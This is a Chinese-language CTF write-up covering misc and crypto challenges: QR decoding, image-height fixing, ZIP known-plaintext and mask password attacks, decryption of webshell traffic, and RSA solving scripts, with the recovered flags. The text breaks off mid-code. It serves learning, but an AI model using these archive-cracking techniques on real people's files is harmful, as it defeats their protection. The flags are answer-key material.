title="Ez_QR"></a>Ez_QR</h2><p>下载并解压附件后是50个二维码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjExMDMwYjQ4NjU3ZTMxNjM1YWIzNmJmNTcyMmVlZjhfdVlGZWhVUFdRd3ZqMUJWUHdhaWF3Wk5QOGxROHhIbDZfVG9rZW46SHpXcGJuMVJKb0lwdmt4YnpDSWNGRnRJbjdlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>依次扫描 ，组合，就得到flag</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>利用python脚本来解决，但是我这个脚本有些许复杂，它只能出来单个的，并且是乱序，需要自己进行排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 读取二维码图片并解析其内容 &quot;&quot;&quot;</span></span><br><span class="line">    reader = zxing.BarCodeReader()</span><br><span class="line">    barcode = reader.decode(image_path)</span><br><span class="line">    <span class="keyword">return</span> barcode.raw <span class="keyword">if</span> barcode <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag_from_folder</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 扫描文件夹中的所有二维码图片并分别显示解析内容 &quot;&quot;&quot;</span></span><br><span class="line">    qr_files = glob.glob(os.path.join(folder_path, <span class="string">&quot;*.png&quot;</span>)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, <span class="string">&quot;*.jpg&quot;</span>)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, <span class="string">&quot;*.jpeg&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> qr_files:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到二维码图片&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    flag_parts = []</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">sorted</span>(qr_files):  <span class="comment"># 按文件名排序，确保顺序正确</span></span><br><span class="line">        content = read_qr_code(file)</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件: <span class="subst">&#123;os.path.basename(file)&#125;</span> -&gt; 内容: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">            flag_parts.append(content)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag_parts)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n完整 Flag:&quot;</span>, flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    folder_path = <span class="string">r&quot;D:\第二次校赛\attachment_QR&quot;</span>  <span class="comment"># 你的二维码图片文件夹路径</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件夹不存在，请检查路径是否正确！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        extract_flag_from_folder(folder_path)</span><br></pre></td></tr></table></figure><p>他的输出结果就是下面这样</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJhMWQ2OGI0ODc2YTE2OWI4ZGI3ZjQzZDE2NDA4MDVfQmhaZ29BU2xYS3dadUhhZFRjVEVJZENKQ0FmdGpISHVfVG9rZW46RWZnR2IyeEI0b1NFeWR4N0wwVWNzeDZFblpnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>利用网站批量扫描 <a href="https://cli.im/deqr/other">https://cli.im/deqr/other</a></p><h2 id="你是mvp还是躺赢狗？"><a href="#你是mvp还是躺赢狗？" class="headerlink" title="你是mvp还是躺赢狗？"></a>你是mvp还是躺赢狗？</h2><p>打开附件后是下面的这样的一张图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwM2M0NDY5Y2JiMDQxNzhlMDlhMjY1NzcxZjhlYWNfZ0dCd0dNbE9DSFNhRlBrYzA2SmJBRWNHdUFaZFNlYjVfVG9rZW46TmJYSGJKT1lZb1pFcHV4MnZOcmNIS0xUblRjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>将其拖进010，看看有没有隐藏的东西</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjYzOTFlMjQ0NjBlZjNjODA0MTJhOWQ3MzRmOTk3ZGJfdnEyT1hkd2haQW01cXV2TlZGUER4UkZNdURZd092djJfVG9rZW46V210MGI0dGlCb1RQdkh4U1hia2NtQUJNbnloXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>在010中可以看出有另外一个压缩包，复制后在010中新建一个文件，并保存</p><p>打开后 ，是这样的一幅图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y4NzhkOWQxNGMxMTk1YzVkZWU5YzE1YjNiOTkxNWJfOE1PbEplbU9vaGVVaTFRaEtFejgwOE11akNxWm5SVVdfVG9rZW46SnNBWGJYVzRDb0MxZGR4WkFFOWNxU0JLbmRnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>很显然，图片的高度被切割了</p><p>可以在010中修改图片的高度，像下面橘色区域的位置，我这是已经修改好的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQwMWM2YjA2Y2JiODA1NDVlMjI2YTU2YmE0NjgzNTVfMFpuSjVJSkgyWEttZmtmaXoyV29WTlgzVnpuYkJMOXpfVG9rZW46UGU5d2J2TXpCb1RqWkh4MEZzVmM1MkdSbnBkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>保存后，重新打开这张图片就能看到被隐藏的flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2M0MTk2MjY5ODEzYWNmNWViYzIwNjllZWVjNGJkOTRfN3g5NkVXUWhjMFlYRjN6a2VORzhNMlZsU1lNRkVjZmZfVG9rZW46RjlOeWJobExSb09mQjh4SVBaT2NWVGxwbnZiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;l00k_1n_My_3ye5_!&#125;</span><br></pre></td></tr></table></figure><h2 id="奇怪的动图"><a href="#奇怪的动图" class="headerlink" title="奇怪的动图"></a>奇怪的动图</h2><p>根据提示，这道题目利用明文攻击</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjM2MjU4ZWEzMGU3ZWJiZGZiMTI2MWQwYjc2Mjg3OGVfdXdTckZpbzVjdkdIeVFGdkdzODZJWkNjVUtTYjhxOWZfVG9rZW46TEszOWJKVW01b2d4dDV4akxndWNkNWtabmFmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>压缩orgin.gif成zip文件</p><p>利用ARCHPR工具进行明文攻击</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MmYxNjMxOTFlYTY2MjUzMGQ3OGNmMjE1YjJmODcwZDdfVTd4UTI4Z2RLS2lLdzdRVndsaXlYOTBoN3J2WDR6Q2hfVG9rZW46U1ZJUmI2Umtsb0U3aGh4VmZvdWN1cks3bnZjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2I0NzNmNzM5ZmFhMzA5YjUzMmIwOGExZWJmZDBhOGJfV2RWdjZmTHhUSnhidE9iTGxNVzZSMW9tNnVWTGFOR3pfVG9rZW46QURYNmJ3SUNHb0tTS094S0xPVmM4VTZtbnZkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>我们根据wp中已知：flag的二进制数列转换成不同大小的帧间隔（因为gif非常的卡）</p><p>利用puzzlesolve提取帧间隔</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMxMTAwMTUyOTM0YTMyYjY4OTY2OTI0ZmE0M2QzN2NfZ1hobE5MRmdpSEhHdFZ6V2hXS2k5dUFIZnJWdllpdldfVG9rZW46WTdZNGJIWkxBb3BZMWh4UWZzdGNqZXlKbm9iXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>利用赛博厨子</p><p>将30改0，130改1，如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg0MmIwMzJmMzRiMWQ4M2VjZTI0YTNjNGMyZGYwMTdfaUZkVXpIOVI5RVpiclJMdThmWWNzb1NRM2Q2OWVzV0hfVG9rZW46TnZ3OWI0MXNmb2ZtTVF4Ym10TmM2VkNVbkFiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0100000000110001010001100101111101101001001101010101111101100001011011010100000001111010001100010110111000111001</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDVlYjg0OTg0ZDJlOGZkZTY1YWY5NDdmZGVhNzQ3YjJfUm4yVkJidWhjY3VuOXE1TUQ5MGoxSWZaNTJHREVGUEhfVG9rZW46SnFQYmJFbXd2b3lPRXl4NjR6OWNrYmdJbjhPXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>得到flag：<code>QLNU&#123;@1F_i5_am@z1n9&#125;</code></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开后说flag为UUxOVXtxMW51X3l5ZDUhfQ&#x3D;&#x3D;</p><p>利用赛博厨子进行转换，最终得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;q1nu_yyd5!&#125;</span><br></pre></td></tr></table></figure><h2 id="生日的祝福"><a href="#生日的祝福" class="headerlink" title="生日的祝福"></a>生日的祝福</h2><p>从祝福信中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDRiYWM2NjVkNjg3MjU1MmExNzNhNTYzZDdlMTMxNmFfNUlkVzN1QjhCdUN5d1N0YlV1Tzd5VUFFZFdudUhMQjNfVG9rZW46SjhPVWJ2SzZQb0FSOEN4VVV0dGNKRkZublllXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>得到密码的形式，及使用binwalk工具</p><p>另外我们还有一个不知格式的生日礼物</p><p>我们看看它的十六进制，看看有什么隐藏的线索</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY3Y2YyYjQyYjYzYmNiNTZjOTIwNzJiYTc4MGM3ZGFfS0hveTJPNndpejhlZzJGOHhvR0QyeWV0R3dJUmxFSXRfVG9rZW46TDNPWmJIdGFRbzNoQm14d1BMVWNNWkdhbkNhXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>新建一个文件，将下面的十六进制文本复制，如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=M2M2OWFkMjA1ZmE1N2ZlNTNhZmNhNWEyYmY1NTAxYTdfdzBKSlN3S0hmcnZCSnhoNUN5TmRuS25rTEx3SkFGRGdfVG9rZW46T2xoMWJRZlJib1ZJYm54eGhFdGNkdWRnbk1lXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>保存成zip文件</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQxMjVkZDdhNTMwNWZhOGI1N2Q2ZTI5OGVlZGQ5YjhfRFpKa3Q3VVA2VnhRS09kNGRERUVCeEpRWmdLY2hVU2FfVG9rZW46UDBPaWJyUE9JbzhjN0Z4STJKUWNBNE5Gbkp0XzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>这个时候要找到压缩文件的密钥，也就是从生日祝福中得到的线索</p><p>这个时候利用我们已知的信息进行掩码攻击</p><p>格式：<code>??-18??-??-14</code></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NmU1NmNhMTllNWNiMmU4YmZkOWVlYTk3MzA0NTBhMGRfUDVjTG0xdzdROVVmUG5NVTRpWXhCcEdwemVkdEtGT3RfVG9rZW46SU1PNGI0SENVb0E3UXh4TGtNbGN4Q3h4blBmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTUzN2RkMDhjM2UwM2RiNTIwOTE2YTdmMjc4NDZlNDZfMnMwZVFiUlEyOTduSnhSczZqSDNadFg2MzBHUVFkMVpfVG9rZW46SklWSGJId0NZb25VWWN4NFdSSWNjN1NybjRlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>得到密码为<code>xy-1845-11-14</code></p><p>放进赛博厨子，进行了16次不换表base64解密，即偏移量为16</p><p>打开后看到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzExMjA0NmVhZDdkNWI2ZGE4ZThlMTE1M2MzNjc4NGJfMzRkbDNaM1JXMEZobkJsZ0hvZlF4UFlYNDdnZ2V5QkFfVG9rZW46VGYyQ2JPWmpLb0k5cFR4SldLQWM1b2xNbkxoXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>我们在另外一个文件中看到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjNkZDdkMjY0NzgzMmM3OGY0N2Y5NmVlY2ZjYjAzZGJfRnpkY2Nid0JoWGdWRjc3WnFzNmtYSnFudDdTbWg3bjRfVG9rZW46Tk5tQmI2bEV1b1JTM014TDRid2MwcDl2bnliXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>给他进行凯撒解码，得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE4YTcwNTcxOGQ4NjlkNTU0NDYwYTUxNWI2YzcwYTVfMnduMXN1VkxMYkhQajZRRHZ4bEFiV0VidVdMN2M5ZEdfVG9rZW46VEF5VmJWZFVNb3lEeDZ4aXhSZmNlR3FObnVjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>这样就得到新表为：<code>ABCDEFGabcdefghijklmnopqrstuvwxyzHIJKLMNOPQRST0123456789+/UVWXYZ</code></p><p>再进行base64解码，4次，得到flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTY2Mzg5ZWRlNGQ0MGQxYzZkZTgzOGVlZmU2YmJhYjNfelgzRU5VdzU2RnRSRnlEN01yYkNVOEwwTjhnNXhlbVFfVG9rZW46RXdEM2JSM0RDbzdjVUN4WldnUmNLZER0bkxlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;Y0u_@r4_gO0d_Ctfer!&#125;</span><br></pre></td></tr></table></figure><h2 id="NetTraffic"><a href="#NetTraffic" class="headerlink" title="NetTraffic"></a>NetTraffic</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjIyNTVkMTg1ZDNjNzkwZjMzMmFlYzdjOTgwZTBkN2Ffa205eEd3aEN0dktkZHZsVDNlMTcxWWp0TlZHOXl3b0NfVG9rZW46RzJrUGJIajJMb1YweXh4REtYbmNDOUtWblBkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM5ZGQ1NzEwN2QxY2FmZjI4MTZjOTFmYTNiZmFkYzRfa2dMdUFPZXM4a0dxRWdtekEzeXV5WnVRU2hFcFJCbEdfVG9rZW46R1UwQmJuc2RUbzBDTDN4a3FIZmNiMnZLbkJjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e45e329feb5d925b</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZlY2M3MmYzMzMwYTI5NmVhZjA4MWJlOTFiYzM3ZjVfVmg5UmtvSDFYTVVNQVRVb2NidXFiU0dBV1BDVE5YRTlfVG9rZW46RG5ISWJ3d3kzb3NXbXB4S0lJYWNGMWJXbndmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7iPM15/igg+WdSX6rY+JBrmtNQgtQXXmACCBBgYmo3UC3C0ttYlk6fo7cEZ4KL2ywLgZlrAte/3VIAP80dXyUz/tEWGpwURP8oXl3z7kUkzk1oWz3A7q76gXiDzi0WuWNBNNOd/IKpT3XrRVblJ3yMo0N8Frw9kmCkJpK8gnIKag==</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjUzYmNhYmVhM2EyOThhNzQ0NmE5NjUwY2FjYjQ0NGNfOVpSYzQwYjJqcFFKbUlkSWd6YVl6NXQ5N2kzNk55TnZfVG9rZW46QUNmNWJmejJKb0R4bU94VGh1YmNIWUFVbjZiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>继续往下找</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjFlNGRlNmRlNTU5N2U2ZDMxYjRjNDg1Y2U1MWJlOThfdFRQd1F1dGZxaFQ3VkcxbWZ1V1R0eVg2aU5vbnlRRklfVG9rZW46QnhwZGJLT3NQb1hEWGd4aXRlTGNwZ1lXbjNnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j6FRdeJTeKrveUGDa4E0d7ntz2dsvDXhVWBK0RRSwrdm5Puy5yjoJ/kEwBRPs7RVZed8+l7HBOmx/mDvLCbKp8V</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDVlMjE1NTZiNTAwOWI5NWVjOGZmYzg5YjA4YmIzMWNfRzBXeEhMMDlVek5ZdkJCWnVWcE5QZXdMSHZGaGJZeE1fVG9rZW46SWNPV2JncjI4b0JTM2F4Q3d2UmNaanBQbklmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGE0MDhlMGQ3MTYzNDg5MjNkZjcyZmRjZmU2OWMxNTNfNHRTTUZUWjBFbjlzOVlHbVltNXRzeUVndG50UTNYSlFfVG9rZW46VHpEMWJsUXRzb2VaNzN4elZ3SGNMRVFqbkhkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>获得flag：<code>QLNU&#123;b3h1NdEr_WebShEll_A_L1ttle_hArd&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span></span><br><span class="line"></span><br><span class="line">q= <span class="number">131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span></span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span></span><br><span class="line"></span><br><span class="line">求明文m</span><br></pre></td></tr></table></figure><p>利用脚本来解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的参数</span></span><br><span class="line">p = <span class="number">90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span></span><br><span class="line">q = <span class="number">131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 n 和 φ(n)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d = e^(-1) mod φ(n)</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密过程：m = c^d mod n</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文从数字转换为字符串（假设明文是ASCII编码）</span></span><br><span class="line">m_hex = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]  <span class="comment"># 将明文转换为十六进制字符串</span></span><br><span class="line">m_bytes = <span class="built_in">bytes</span>.fromhex(m_hex)  <span class="comment"># 将十六进制字符串转换为字节</span></span><br><span class="line">m_text = m_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 将字节解码为字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文 m:&quot;</span>, m_text)</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;9f873f1c0315202caf47572a0bc24715&#125;</span><br></pre></td></tr></table></figure><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>先看提示：e很大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = gmpy2.invert(d, (p**<span class="number">2</span> - <span class="number">1</span>) * (q**<span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">&quot;QLNU&#123;&quot;</span> + hashlib.md5(<span class="built_in">str</span>(p + q).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">p_q=p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=\n&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p_q=&quot;</span>,p_q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e= 11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span></span><br><span class="line"><span class="comment">#p_q= 130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span></span><br></pre></td></tr></table></figure><p>找脚本来解决这个问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 